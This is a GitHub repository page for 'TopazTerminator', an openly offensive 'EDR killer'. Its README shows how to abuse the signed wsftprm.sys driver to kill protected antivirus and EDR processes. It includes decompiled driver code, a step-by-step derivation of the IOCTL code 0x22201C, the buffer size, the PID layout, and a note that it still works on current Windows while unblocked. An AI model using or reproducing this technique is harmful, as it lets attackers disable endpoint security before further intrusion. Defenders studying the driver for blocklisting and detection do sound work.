# https://github.com/ThanniKudam/TopazTerminator

[Skip to content](https://github.com/ThanniKudam/TopazTerminator#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/ThanniKudam/TopazTerminator) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/ThanniKudam/TopazTerminator) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/ThanniKudam/TopazTerminator) to refresh your session.Dismiss alert

{{ message }}

[ThanniKudam](https://github.com/ThanniKudam)/ **[TopazTerminator](https://github.com/ThanniKudam/TopazTerminator)** Public

- [Notifications](https://github.com/login?return_to=%2FThanniKudam%2FTopazTerminator) You must be signed in to change notification settings
- [Fork\\
15](https://github.com/login?return_to=%2FThanniKudam%2FTopazTerminator)
- [Star\\
103](https://github.com/login?return_to=%2FThanniKudam%2FTopazTerminator)


Just another EDR killer


### License

[MIT license](https://github.com/ThanniKudam/TopazTerminator/blob/main/LICENSE)

[103\\
stars](https://github.com/ThanniKudam/TopazTerminator/stargazers) [15\\
forks](https://github.com/ThanniKudam/TopazTerminator/forks) [Branches](https://github.com/ThanniKudam/TopazTerminator/branches) [Tags](https://github.com/ThanniKudam/TopazTerminator/tags) [Activity](https://github.com/ThanniKudam/TopazTerminator/activity)

[Star](https://github.com/login?return_to=%2FThanniKudam%2FTopazTerminator)

[Notifications](https://github.com/login?return_to=%2FThanniKudam%2FTopazTerminator) You must be signed in to change notification settings

# ThanniKudam/TopazTerminator

main

[**1** Branch](https://github.com/ThanniKudam/TopazTerminator/branches) [**0** Tags](https://github.com/ThanniKudam/TopazTerminator/tags)

[Go to Branches page](https://github.com/ThanniKudam/TopazTerminator/branches)[Go to Tags page](https://github.com/ThanniKudam/TopazTerminator/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![ThanniKudam](https://avatars.githubusercontent.com/u/72503981?v=4&size=40)](https://github.com/ThanniKudam)[ThanniKudam](https://github.com/ThanniKudam/TopazTerminator/commits?author=ThanniKudam)<br>[Update README.md](https://github.com/ThanniKudam/TopazTerminator/commit/14c3e3328d46556b2fc958bcf8d81336ad081f7b)<br>last monthJan 21, 2026<br>[14c3e33](https://github.com/ThanniKudam/TopazTerminator/commit/14c3e3328d46556b2fc958bcf8d81336ad081f7b) · last monthJan 21, 2026<br>## History<br>[9 Commits](https://github.com/ThanniKudam/TopazTerminator/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/ThanniKudam/TopazTerminator/commits/main/) 9 Commits |
| [LICENSE](https://github.com/ThanniKudam/TopazTerminator/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/ThanniKudam/TopazTerminator/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/ThanniKudam/TopazTerminator/commit/6cf2a14ac6b4776b4ac712f506dee0a591eb13dd "Initial commit") | last monthJan 19, 2026 |
| [README.md](https://github.com/ThanniKudam/TopazTerminator/blob/main/README.md "README.md") | [README.md](https://github.com/ThanniKudam/TopazTerminator/blob/main/README.md "README.md") | [Update README.md](https://github.com/ThanniKudam/TopazTerminator/commit/14c3e3328d46556b2fc958bcf8d81336ad081f7b "Update README.md") | last monthJan 21, 2026 |
| [topazkiller.c](https://github.com/ThanniKudam/TopazTerminator/blob/main/topazkiller.c "topazkiller.c") | [topazkiller.c](https://github.com/ThanniKudam/TopazTerminator/blob/main/topazkiller.c "topazkiller.c") | [Update topazkiller.c](https://github.com/ThanniKudam/TopazTerminator/commit/08d19848e781fe52b63dd0becc521870a30f6add "Update topazkiller.c") | last monthJan 19, 2026 |
| View all files |

## Repository files navigation

# TopazTerminator

[Permalink: TopazTerminator](https://github.com/ThanniKudam/TopazTerminator#topazterminator)

F, Another driver got burned.. I was gatekeeping wsftprm.sys driver for a while ;) but since someone posted a public POC, I'm ungatekeeping it. We all know it'll get added to the driver blocklist soon, so here's my implementation for the same — in C

This project exploits the vulnerable `wsftprm.sys` (Topaz Antifraud kernel driver) to terminate protected processes (e.g., antivirus/EDR services) on Windows.

As of **January 2026**, `wsftprm.sys` (SHA-256: `FF5DBDCF6D7AE5D97B6F3EF412DF0B977BA4A844C45B30CA78C0EEB2653D69A8`) remains one of the signed vulnerable drivers that is **not** on Microsoft's official Vulnerable Driver Blocklist

### RE

[Permalink: RE](https://github.com/ThanniKudam/TopazTerminator#re)

There's shit ton of info on how to load & reverse a driver so refer to any of them. The only thing that's interesting about this driver is how they handle the IOCTLs.. The driver does **not** use a standard `switch` statement for IOCTL dispatching. Instead, it employs a chain of subtractions from the IOCTL code to obscure the intended values.

#### Main Dispatch Function (IRP\_MJ\_DEVICE\_CONTROL handler)

[Permalink: Main Dispatch Function (IRP_MJ_DEVICE_CONTROL handler)](https://github.com/ThanniKudam/TopazTerminator#main-dispatch-function-irp_mj_device_control-handler)

```
__int64 __fastcall DispatchDeviceControl(__int64 a1, __int64 a2, ...)
{
    // ...
    v7 = IoControlCode;  // v6[6] = Parameters.DeviceIoControl.IoControlCode

    v8  = v7 - 0x222000;
    v9  = v8 - 4;
    v10 = v9 - 4;
    v11 = v10 - 16;

    if ( v11 == 4 && InputBufferLength == 1036 )
    {
        // Copy 1036-byte input buffer
        // Extract first DWORD as PID (v41)
        // Call sub_14000264C(v41, buffer) → leads to termination
    }
}
```

#### ZwTerminateProcess() func call

[Permalink: ZwTerminateProcess() func call](https://github.com/ThanniKudam/TopazTerminator#zwterminateprocess-func-call)

```
sub_14000264C(unsigned int a1, __int64 a2)
{
    // ...
    v4 = sub_140002848(a1);  // a1 = PID from buffer[0..3]
}

__int64 __fastcall sub_140002848(unsigned int a1)  // PID
{
    CLIENT_ID ClientId = { (HANDLE)a1, 0 };
    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), 0, 0, 0, 0, 0 };
    HANDLE ProcessHandle;

    ZwOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &ObjAttr, &ClientId);
    if (NT_SUCCESS(status) && ProcessHandle)
    {
        ZwTerminateProcess(ProcessHandle, 0);
        ZwClose(ProcessHandle);
    }
    // ...
}
```

#### Calculating the IOCTL Code (by reversing the Subtractions)

[Permalink: Calculating the IOCTL Code (by reversing the Subtractions)](https://github.com/ThanniKudam/TopazTerminator#calculating-the-ioctl-code-by-reversing-the-subtractions)

so now we know the prereq to reach vulnfunc. Basically `v11 == 4 && InputBufferLength == 1036` so we can sort of work backwards from the condition to get the IOCTL Code..
Something like this:

```
v11 == 4
→ v10 - 16 == 4    → v10 = 20 (0x14)
→ v9  - 4  == 20   → v9  = 24 (0x18)
→ v8  - 4  == 24   → v8  = 28 (0x1C)
→ v7  - 0x222000 == 28 → v7 = 0x222000 + 0x1C = 0x22201C
```

And then you can use DeviceIoControl with the IOCTL code to terminate the process you want (including PPL processes)

Last tested on Windows Version 25H2!

## About

Just another EDR killer


### Resources

[Readme](https://github.com/ThanniKudam/TopazTerminator#readme-ov-file)

### License

[MIT license](https://github.com/ThanniKudam/TopazTerminator#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/ThanniKudam/TopazTerminator).

[Activity](https://github.com/ThanniKudam/TopazTerminator/activity)

### Stars

[**103**\\
stars](https://github.com/ThanniKudam/TopazTerminator/stargazers)

### Watchers

[**0**\\
watching](https://github.com/ThanniKudam/TopazTerminator/watchers)

### Forks

[**15**\\
forks](https://github.com/ThanniKudam/TopazTerminator/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FThanniKudam%2FTopazTerminator&report=ThanniKudam+%28user%29)

## [Releases](https://github.com/ThanniKudam/TopazTerminator/releases)

No releases published

## [Packages\  0](https://github.com/users/ThanniKudam/packages?repo_name=TopazTerminator)

No packages published

## Languages

- [C100.0%](https://github.com/ThanniKudam/TopazTerminator/search?l=c)

You can’t perform that action at this time.